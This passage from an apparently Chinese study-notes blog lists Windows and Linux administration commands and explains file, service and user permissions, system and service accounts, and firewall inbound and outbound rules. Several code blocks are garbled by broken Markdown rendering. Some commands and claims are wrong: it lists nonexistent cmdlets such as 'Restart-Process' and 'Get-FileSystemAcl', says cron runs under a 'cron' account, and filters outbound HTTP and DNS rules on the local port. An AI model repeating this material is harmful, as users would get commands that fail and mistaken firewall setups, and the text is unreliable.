&quot;C:\Path\To\File.txt&quot;</code>：删除文件。</li><li><code>Remove-Item &quot;C:\Path\To\Folder&quot; -Recurse</code>：递归删除目录及其内容。</li><li><code>Copy-Item &quot;C:\Path\To\Source&quot; &quot;C:\Path\To\Destination&quot;</code>：复制文件或目录。</li><li><code>Move-Item &quot;C:\Path\To\Source&quot; &quot;C:\Path\To\Destination&quot;</code>：移动或重命名文件或目录。</li><li><code>Rename-Item &quot;C:\Path\To\OldName.txt&quot; &quot;NewName.txt&quot;</code>：重命名文件或目录。</li></ul></li><li><strong>文件内容查看</strong><ul><li><code>Get-Content &quot;C:\Path\To\File.txt&quot;</code>：显示文件内容。</li><li><code>Get-Content &quot;C:\Path\To\File.txt&quot; -First 10</code>：显示文件的前10行。</li><li><code>Get-Content &quot;C:\Path\To\File.txt&quot; -Last 10</code>：显示文件的后10行。</li><li><code>Select-String -Path &quot;C:\Path\To\File.txt&quot; -Pattern &quot;searchPattern&quot;</code>：在文件中搜索文本。</li></ul></li><li><strong>文件编辑</strong><ul><li><code>Set-Content &quot;C:\Path\To\File.txt&quot; &quot;New content&quot;</code>：覆盖文件内容。</li><li><code>Add-Content &quot;C:\Path\To\File.txt&quot; &quot;Additional content&quot;</code>：追加内容到文件。</li><li><code>Out-File &quot;C:\Path\To\File.txt&quot;</code>：将输出重定向到文件。</li></ul></li></ul><h3 id="网络配置-2"><a href="#网络配置-2" class="headerlink" title="网络配置"></a>网络配置</h3><ul><li><strong>网络连接</strong><ul><li><code>Get-NetIPAddress</code>：显示网络IP地址信息。</li><li><code>Get-NetIPConfiguration</code>：显示网络配置信息。</li><li><code>Test-Connection -ComputerName www.example.com</code>：测试网络连接。</li><li><code>Ping www.example.com</code>：发送ICMP回显请求。</li><li><code>Tracert www.example.com</code>：显示到目标主机的网络路径。</li></ul></li><li><strong>网络服务</strong><ul><li><code>Get-NetFirewallRule</code>：显示防火墙规则。</li><li><code>New-NetFirewallRule</code>：创建新的防火墙规则。</li><li><code>Remove-NetFirewallRule</code>：删除防火墙规则。</li><li><code>Get-DnsClientServerAddress</code>：显示DNS服务器地址。</li><li><code>Set-DnsClientServerAddress -InterfaceIndex &lt;Index&gt; -ServerAddresses &lt;DNS1&gt;,&lt;DNS2&gt;</code>：设置DNS服务器地址。</li></ul></li></ul><h3 id="进程管理-2"><a href="#进程管理-2" class="headerlink" title="进程管理"></a>进程管理</h3><ul><li><strong>查看进程</strong><ul><li><code>Get-Process</code>：列出所有进程。</li><li><code>Get-Process &lt;进程名&gt;</code>：显示特定进程的信息。</li></ul></li><li><strong>管理进程</strong><ul><li><code>Start-Process &quot;C:\Path\To\Program.exe&quot;</code>：启动新进程。</li><li><code>Stop-Process -Id &lt;进程ID&gt;</code>：终止进程。</li><li><code>Stop-Process -Name &lt;进程名&gt;</code>：终止所有同名进程。</li><li><code>Restart-Process -Id &lt;进程ID&gt;</code>：重启进程。</li></ul></li></ul><h3 id="用户和权限管理-2"><a href="#用户和权限管理-2" class="headerlink" title="用户和权限管理"></a>用户和权限管理</h3><ul><li><strong>用户和组</strong><ul><li><code>Get-LocalUser</code>：列出所有本地用户。</li><li><code>Get-LocalGroup</code>：列出所有本地组。</li><li><code>New-LocalUser &quot;Username&quot; -Password (ConvertTo-SecureString -AsPlainText &quot;Password&quot; -Force)</code>：创建新用户。</li><li><code>Remove-LocalUser &quot;Username&quot;</code>：删除用户。</li><li><code>Add-LocalGroupMember -Group &quot;GroupName&quot; -Member &quot;Username&quot;</code>：将用户添加到组。</li><li><code>Remove-LocalGroupMember -Group &quot;GroupName&quot; -Member &quot;Username&quot;</code>：将用户从组中删除。</li></ul></li><li><strong>权限管理</strong><ul><li><code>Get-Acl &quot;C:\Path\To\File.txt&quot;</code>：显示文件或目录的访问控制列表（ACL）。</li><li><code>Set-Acl &quot;C:\Path\To\File.txt&quot; $acl</code>：设置文件或目录的访问控制列表。</li><li><code>Get-ItemProperty -Path &quot;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&quot;</code>：查看注册表项。</li><li><code>Set-ItemProperty -Path &quot;HKLM:\Software\Microsoft\Windows\CurrentVersion\Run&quot; -Name &quot;AppName&quot; -Value &quot;C:\Path\To\Program.exe&quot;</code>：设置注册表项。</li></ul></li></ul><h3 id="磁盘管理-2"><a href="#磁盘管理-2" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><ul><li><strong>磁盘分区</strong><ul><li><code>Get-Disk</code>：显示磁盘信息。</li><li><code>Get-Partition</code>：显示分区信息。</li><li><code>New-Partition -DiskNumber 1 -Size 10GB -DriveLetter D</code>：创建新分区。</li><li><code>Format-Volume -DriveLetter D -FileSystem NTFS</code>：格式化分区。</li><li><code>Optimize-Volume -DriveLetter C</code>：优化磁盘。</li></ul></li><li><strong>磁盘配额</strong><ul><li><code>Get-Volume</code>：显示卷信息。</li><li><code>Get-FileSystemAcl -Path &quot;C:\Path\To\Folder&quot;</code>：显示文件系统配额。</li></ul></li></ul><h3 id="其他常用命令-2"><a href="#其他常用命令-2" class="headerlink" title="其他常用命令"></a>其他常用命令</h3><ul><li><strong>压缩和解压</strong><ul><li><code>Compress-Archive -Path &quot;C:\Path\To\Folder&quot; -DestinationPath &quot;C:\Path\To\Archive.zip&quot;</code>：创建压缩文件。</li><li><code>Expand-Archive -Path &quot;C:\Path\To\Archive.zip&quot; -DestinationPath &quot;C:\Path\To\Extract&quot;</code>：解压文件。</li></ul></li><li><strong>时间日期</strong><ul><li><code>Get-Date</code>：显示当前日期和时间。</li><li><code>Set-Date -Date &quot;2024-01-01 12:00:00&quot;</code>：设置系统日期和时间。</li></ul></li><li><strong>任务调度</strong><ul><li><code>Get-ScheduledTask</code>：列出所有计划任务。</li><li><code>New-ScheduledTask</code>：创建新的计划任务。</li><li><code>Start-ScheduledTask -TaskName &quot;TaskName&quot;</code>：启动计划任务。</li><li><code>Stop-ScheduledTask -TaskName &quot;TaskName&quot;</code>：停止计划任务。</li></ul></li><li><strong>系统监控</strong><ul><li><code>Get-Counter -Counter &quot;\Processor(_Total)\% Processor Time&quot;</code>：显示CPU使用率。</li><li><code>Get-Counter -Counter &quot;\Memory\Available MBytes&quot;</code>：显示可用内存。</li><li><code>Get-Counter -Counter &quot;\Network Interface(*)\Bytes Total/sec&quot;</code>：显示网络流量。</li></ul></li></ul><h2 id="5-文件权限，用户权限，服务权限"><a href="#5-文件权限，用户权限，服务权限" class="headerlink" title="5.文件权限，用户权限，服务权限"></a>5.文件权限，用户权限，服务权限</h2><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p><strong>定义</strong>： 文件权限是指对文件或目录进行访问和操作的权限设置。这些权限决定了用户或组可以对文件或目录执行哪些操作，如读取、写入、执行等。</p><p><strong>常见权限类型</strong>：</p><ul><li><strong>读取（Read, r）</strong>：允许用户查看文件内容或目录列表。</li><li><strong>写入（Write, w）</strong>：允许用户修改文件内容或目录中的文件。</li><li><strong>执行（Execute, x）</strong>：允许用户执行文件或进入目录。</li></ul><p><strong>在Linux中的表示</strong>：</p><ul><li><p>权限表示</p><p>：使用字符表示，如</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">rwx</span><br></code></pre></td></tr></table></figure><p>。</p><ul><li><code>r</code>：读取权限</li><li><code>w</code>：写入权限</li><li><code>x</code>：执行权限</li><li><code>-</code>：无权限</li></ul></li><li><p>权限分类</p><p>：</p><ul><li><strong>所有者（User, u）</strong>：文件或目录的所有者。</li><li><strong>组（Group, g）</strong>：文件或目录所属组的成员。</li><li><strong>其他用户（Others, o）</strong>：除所有者和组成员之外的其他用户。</li></ul></li></ul><p><strong>示例</strong>：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-rwxr-xr-x 1 user group 1234 Jan 1 12:00 file.txt<br></code></pre></td></tr></table></figure><ul><li><pre><code class="hljs">-rwxr-xr-x<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>  ：权限字符串<br><br><span class="hljs-bullet">  -</span> <span class="hljs-code">`rwx`</span>：所有者有读、写、执行权限<br><span class="hljs-bullet">  -</span> <span class="hljs-code">`r-x`</span>：组成员有读、执行权限<br><span class="hljs-bullet">  -</span> <span class="hljs-code">`r-x`</span>：其他用户有读、执行权限<br><br><span class="hljs-strong">**管理命令**</span>：<br><br><span class="hljs-bullet">-</span> chmod<br><br>  ：更改文件或目录的权限。<br><br><span class="hljs-bullet">  -</span> <span class="hljs-code">`chmod 755 file.txt`</span>：设置文件权限为<span class="hljs-code">`rwxr-xr-x`</span>。<br><span class="hljs-bullet">  -</span> <span class="hljs-code">`chmod u+x file.txt`</span>：给所有者添加执行权限。<br><br><span class="hljs-bullet">-</span> chown<br><br>  ：更改文件或目录的所有者。<br><br><span class="hljs-bullet">  -</span> <span class="hljs-code">`chown user:group file.txt`</span>：将文件的所有者和组分别设置为<span class="hljs-code">`user`</span>和<span class="hljs-code">`group`</span>。<br><br><span class="hljs-bullet">-</span> chgrp<br><br>  ：更改文件或目录的组。<br><br><span class="hljs-bullet">  -</span> <span class="hljs-code">`chgrp group file.txt`</span>：将文件的组设置为<span class="hljs-code">`group`</span>。<br><br><span class="hljs-section">### 服务权限</span><br><br><span class="hljs-strong">**定义**</span>： 服务权限是指对系统服务进行管理和操作的权限设置。这些权限决定了用户或组可以对服务执行哪些操作，如启动、停止、重启、配置等。<br><br><span class="hljs-strong">**常见权限类型**</span>：<br><br><span class="hljs-bullet">-</span> <span class="hljs-strong">**启动（Start）**</span>：允许用户启动服务。<br><span class="hljs-bullet">-</span> <span class="hljs-strong">**停止（Stop）**</span>：允许用户停止服务。<br><span class="hljs-bullet">-</span> <span class="hljs-strong">**重启（Restart）**</span>：允许用户重启服务。<br><span class="hljs-bullet">-</span> <span class="hljs-strong">**配置（Configure）**</span>：允许用户修改服务的配置。<br><br><span class="hljs-strong">**在Windows中的表示**</span>：<br><br><span class="hljs-bullet">-</span> <span class="hljs-strong">**服务管理工具**</span>：<span class="hljs-code">`services.msc`</span>，可以查看和管理所有系统服务。<br><br><span class="hljs-bullet">-</span> 权限设置<br><br>  ：<br><br><span class="hljs-bullet">  -</span> <span class="hljs-strong">**本地组策略编辑器（gpedit.msc）**</span>：用于配置服务的启动类型和权限。<br><span class="hljs-bullet">  -</span> <span class="hljs-strong">**注册表编辑器（regedit）**</span>：用于直接修改服务的注册表项，设置服务的权限。<br><br><span class="hljs-strong">**示例**</span>：<br><br><span class="hljs-bullet">-</span> 启动服务<br><br>  ：<br><br>  powershell<br><br>  <span class="hljs-code">```powershell</span><br><span class="hljs-code">  Start-Service -Name &quot;ServiceName&quot;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>停止服务</p><p>：</p><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Stop-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;ServiceName&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>重启服务</p><p>：</p><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Restart-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;ServiceName&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>设置服务启动类型</p><p>：</p><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-Service</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;ServiceName&quot;</span> <span class="hljs-literal">-StartupType</span> Automatic<br></code></pre></td></tr></table></figure></li></ul><h3 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h3><p><strong>定义</strong>： 用户权限是指用户在系统中可以执行的操作和访问的资源的权限设置。这些权限决定了用户可以访问哪些文件、目录、服务、网络资源等。</p><p><strong>常见权限类型</strong>：</p><ul><li><strong>管理员（Administrator）</strong>：具有最高权限，可以执行几乎所有系统操作。</li><li><strong>普通用户（User）</strong>：具有有限的权限，通常只能访问自己的文件和一些公共资源。</li><li><strong>来宾（Guest）</strong>：具有最低权限，通常用于临时访问，权限非常有限。</li></ul><p><strong>在Windows中的表示</strong>：</p><ul><li><p>用户账户管理</p><p>：</p><ul><li><p><strong>控制面板</strong>：<code>控制面板 &gt; 用户账户</code>，可以创建、删除和管理用户账户。</p></li><li><p>命令行工具</p><p>：</p><ul><li><pre><code class="hljs">net user<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><br>  ：管理用户账户。<br><br>  - `net <span class="hljs-keyword">user</span> <span class="hljs-title">&lt;用户名&gt; /add</span>`：创建新用户。<br>  - `net <span class="hljs-keyword">user</span> <span class="hljs-title">&lt;用户名&gt; /del</span>`：删除用户。<br>  - `net <span class="hljs-keyword">user</span> <span class="hljs-title">&lt;用户名&gt; &lt;新密码&gt;`：设置用户密码。</span><br><span class="hljs-title"></span><br><span class="hljs-title">- ```</span><br><span class="hljs-title">  net</span> localgroup<br></code></pre></td></tr></table></figure>：管理本地组。- `net localgroup &lt;组名&gt; &lt;用户名&gt; /add`：将用户添加到组。- `net localgroup &lt;组名&gt; &lt;用户名&gt; /del`：将用户从组中删除。</code></pre></li></ul></li></ul></li></ul><p><strong>在Linux中的表示</strong>：</p><ul><li><p>用户账户管理</p><p>：</p><ul><li><p>命令行工具</p><p>：</p><ul><li><pre><code class="hljs">useradd<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  ：创建新用户。<br><br>  - `useradd &lt;用户名&gt;`：创建新用户。<br><br>- ```<br>  userdel<br></code></pre></td></tr></table></figure>：删除用户。- `userdel &lt;用户名&gt;`：删除用户。</code></pre></li><li><pre><code class="hljs">usermod<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  ：修改用户属性。<br><br>  - `usermod -aG &lt;组名&gt; &lt;用户名&gt;`：将用户添加到组。<br><br>- ```<br>  groupadd<br></code></pre></td></tr></table></figure>：创建新组。- `groupadd &lt;组名&gt;`：创建新组。</code></pre></li><li><pre><code class="hljs">groupdel<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  ：删除组。<br><br>  - `groupdel &lt;组名&gt;`：删除组。<br><br>- ```<br>  passwd<br></code></pre></td></tr></table></figure>：设置或更改用户密码。- `passwd &lt;用户名&gt;`：设置用户密码。</code></pre></li></ul></li></ul></li></ul><p><strong>示例</strong>：</p><ul><li><p>创建新用户</p><p>：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd newuser<br>passwd newuser<br></code></pre></td></tr></table></figure></li><li><p>将用户添加到组</p><p>：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">usermod -aG <span class="hljs-built_in">sudo</span> newuser<br></code></pre></td></tr></table></figure></li><li><p>删除用户</p><p>：</p><p>bash复制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">userdel newuser<br></code></pre></td></tr></table></figure></li></ul><h2 id="6-系统用户，用户组，服务用户"><a href="#6-系统用户，用户组，服务用户" class="headerlink" title="6.系统用户，用户组，服务用户"></a>6.系统用户，用户组，服务用户</h2><h3 id="系统用户（System-User）"><a href="#系统用户（System-User）" class="headerlink" title="系统用户（System User）"></a>系统用户（System User）</h3><p><strong>定义</strong>： 系统用户是指在操作系统中用于运行特定系统服务或应用程序的用户账户。这些用户通常不是用来登录系统进行交互式操作的，而是用于特定的服务或进程，以确保系统的安全性和隔离性。</p><p><strong>特点</strong>：</p><ul><li><strong>权限限制</strong>：系统用户通常具有有限的权限，只能访问和操作与特定服务相关的资源。这有助于减少安全风险，防止服务被滥用。</li><li><strong>自动创建</strong>：系统用户通常在安装或配置服务时自动创建，不需要手动干预。</li><li><strong>不可登录</strong>：系统用户通常不允许登录系统进行交互式操作，只能通过服务或进程进行操作。</li></ul><p><strong>示例</strong>：</p><ul><li><p><strong>Apache服务</strong>：在Linux系统中，Apache服务通常运行在<code>www-data</code>（Debian&#x2F;Ubuntu）或<code>apache</code>（CentOS&#x2F;RHEL）用户下。这些用户只能访问Apache服务所需的文件和目录，不能登录系统。</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep apache<br></code></pre></td></tr></table></figure><p>输出可能显示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">apache    1234  0.0  0.1  12345  1234 ?        S    12:00   0:00 /usr/sbin/httpd<br></code></pre></td></tr></table></figure></li><li><p><strong>MySQL服务</strong>：MySQL服务通常运行在<code>mysql</code>用户下。这个用户只能访问MySQL的数据目录和配置文件，不能登录系统。</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep mysql<br></code></pre></td></tr></table></figure><p>输出可能显示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">mysql     1234  0.0  0.1  12345  1234 ?        S    12:00   0:00 /usr/sbin/mysqld<br></code></pre></td></tr></table></figure></li></ul><h3 id="用户组（User-Group）"><a href="#用户组（User-Group）" class="headerlink" title="用户组（User Group）"></a>用户组（User Group）</h3><p><strong>定义</strong>： 用户组是指一组具有相同权限和属性的用户集合。用户组用于简化权限管理，通过将多个用户添加到同一个组，可以统一管理这些用户的权限。</p><p><strong>特点</strong>：</p><ul><li><strong>权限管理</strong>：用户组可以被赋予特定的权限，这些权限会自动应用到组内的所有用户。这使得权限管理更加高效和集中。</li><li><strong>灵活性</strong>：用户可以属于多个组，从而继承多个组的权限。</li><li><strong>简化管理</strong>：通过用户组，系统管理员可以轻松地管理大量用户的权限，而不需要逐个设置每个用户的权限。</li></ul><p><strong>示例</strong>：</p><ul><li><p><strong>创建用户组</strong>：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">groupadd developers<br></code></pre></td></tr></table></figure></li><li><p><strong>将用户添加到组</strong>：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">usermod -aG developers user1<br>usermod -aG developers user2<br></code></pre></td></tr></table></figure></li><li><p><strong>查看用户组</strong>：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">groups</span> user1<br></code></pre></td></tr></table></figure><p>输出可能显示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">user1 : user1 developers<br></code></pre></td></tr></table></figure></li></ul><h3 id="服务用户（Service-User）"><a href="#服务用户（Service-User）" class="headerlink" title="服务用户（Service User）"></a>服务用户（Service User）</h3><p><strong>定义</strong>： 服务用户是指专门为运行特定服务或应用程序而创建的用户账户。这些用户通常具有特定的权限，只能访问和操作与该服务相关的资源，以确保服务的正常运行和系统的安全。</p><p><strong>特点</strong>：</p><ul><li><strong>专用账户</strong>：服务用户通常是为了特定服务而创建的，具有特定的权限和配置。</li><li><strong>隔离性</strong>：服务用户可以隔离服务的运行环境，防止服务之间的相互干扰和安全风险。</li><li><strong>权限限制</strong>：服务用户通常具有有限的权限，只能访问和操作与该服务相关的资源。</li></ul><p><strong>示例</strong>：</p><ul><li><p><strong>SSHD服务</strong>：SSH服务通常运行在<code>sshd</code>用户下。这个用户只能访问SSH服务所需的文件和目录，不能登录系统。</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep sshd<br></code></pre></td></tr></table></figure><p>输出可能显示：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sshd     1234  0.0  0.1  12345  1234 ?        S    12:00   0:00 /usr/sbin/sshd<br></code></pre></td></tr></table></figure></li><li><p><strong>Cron服务</strong>：Cron服务通常运行在<code>cron</code>用户下。这个用户只能访问Cron服务所需的文件和目录，不能登录系统。</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux | grep cron<br></code></pre></td></tr></table></figure><p>输出可能显示：</p><p>复制</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">cron     1234  0.0  0.1  12345  1234 ?        S    12:00   0:00 /usr/sbin/cron<br></code></pre></td></tr></table></figure></li></ul><h2 id="7-自带防火墙出战-入站规则策略协议"><a href="#7-自带防火墙出战-入站规则策略协议" class="headerlink" title="7.自带防火墙出战&amp;入站规则策略协议"></a>7.自带防火墙出战&amp;入站规则策略协议</h2><h3 id="防火墙出站和入站规则策略协议"><a href="#防火墙出站和入站规则策略协议" class="headerlink" title="防火墙出站和入站规则策略协议"></a>防火墙出站和入站规则策略协议</h3><p>防火墙是网络安全的重要组成部分，用于控制进出网络的流量。防火墙规则可以分为入站规则和出站规则，这些规则基于各种协议和参数来决定是否允许或阻止特定的网络流量。</p><h4 id="入站规则（Inbound-Rules）"><a href="#入站规则（Inbound-Rules）" class="headerlink" title="入站规则（Inbound Rules）"></a>入站规则（Inbound Rules）</h4><p><strong>定义</strong>： 入站规则控制从外部网络进入防火墙保护的内部网络的流量。这些规则决定了哪些外部请求可以被接受，哪些需要被阻止。</p><p><strong>配置方法</strong>：</p><ol><li><p><strong>Windows 防火墙</strong>：</p><ul><li><p>打开“控制面板” -&gt; “系统与安全” -&gt; “防火墙” -&gt; “高级设置”。</p></li><li><p>选择“入站规则” -&gt; “新建规则”。</p></li><li><p>可以配置端口、协议、程序等参数。例如，允许特定端口的TCP流量：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Allow TCP 80&quot;</span> <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow protocol=tcp localport=80<br></code></pre></td></tr></table></figure></li><li><p>也可以根据IP地址范围进行限制：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Allow TCP 80 from specific IP&quot;</span> <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow protocol=tcp localport=80 remoteip=192.168.1.100<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>Linux 防火墙</strong>：</p><ul><li><p>使用 <code>iptables</code> 或 <code>firewalld</code> 工具。</p></li><li><p>例如，允许特定端口的TCP流量：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -A INPUT -p tcp --dport 80 -j ACCEPT<br></code></pre></td></tr></table></figure></li><li><p>也可以根据IP地址范围进行限制：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -A INPUT -p tcp --dport 80 -s 192.168.1.100 -j ACCEPT<br></code></pre></td></tr></table></figure></li></ul></li></ol><h4 id="出站规则（Outbound-Rules）"><a href="#出站规则（Outbound-Rules）" class="headerlink" title="出站规则（Outbound Rules）"></a>出站规则（Outbound Rules）</h4><p><strong>定义</strong>： 出站规则控制从防火墙保护的内部网络发送到外部网络的流量。这些规则决定了内部主机可以访问哪些外部资源。</p><p><strong>配置方法</strong>：</p><ol><li><p><strong>Windows 防火墙</strong>：</p><ul><li><p>打开“控制面板” -&gt; “系统与安全” -&gt; “防火墙” -&gt; “高级设置”。</p></li><li><p>选择“出站规则” -&gt; “新建规则”。</p></li><li><p>可以配置端口、协议、程序等参数。例如，允许特定端口的TCP流量：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Allow TCP 80 Outbound&quot;</span> <span class="hljs-built_in">dir</span>=out action=allow protocol=tcp localport=80<br></code></pre></td></tr></table></figure></li><li><p>也可以根据IP地址范围进行限制：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Allow TCP 80 to specific IP&quot;</span> <span class="hljs-built_in">dir</span>=out action=allow protocol=tcp remoteport=80 remoteip=192.168.1.100<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>Linux 防火墙</strong>：</p><ul><li><p>使用 <code>iptables</code> 或 <code>firewalld</code> 工具。</p></li><li><p>例如，允许特定端口的TCP流量：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT<br></code></pre></td></tr></table></figure></li><li><p>也可以根据IP地址范围进行限制：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -A OUTPUT -p tcp --dport 80 -d 192.168.1.100 -j ACCEPT<br></code></pre></td></tr></table></figure></li></ul></li></ol><h4 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h4><p><strong>协议</strong>：</p><ul><li><strong>TCP（传输控制协议）</strong>：用于需要可靠传输的应用，如HTTP、HTTPS、FTP等。</li><li><strong>UDP（用户数据报协议）</strong>：用于不需要可靠传输的应用，如DNS、SNMP等。</li><li><strong>ICMP（互联网控制消息协议）</strong>：用于网络诊断和错误报告，如ping命令。</li></ul><p><strong>示例</strong>：</p><ul><li><p>允许ICMP流量</p><p>：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Allow ICMP&quot;</span> <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow protocol=icmpv4<br></code></pre></td></tr></table></figure></li><li><p>允许DNS查询</p><p>：</p><p>bash复制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;Allow DNS&quot;</span> <span class="hljs-built_in">dir</span>=out action=allow protocol=udp localport=53<br></code></pre></td></tr></table></figure></li></ul><h1 id="3-网站搭建前置知识"><a href="#3-网站搭建前置知识" class="headerlink" title="3.网站搭建前置知识"></a>3.网站搭建前置知识</h1><p><img 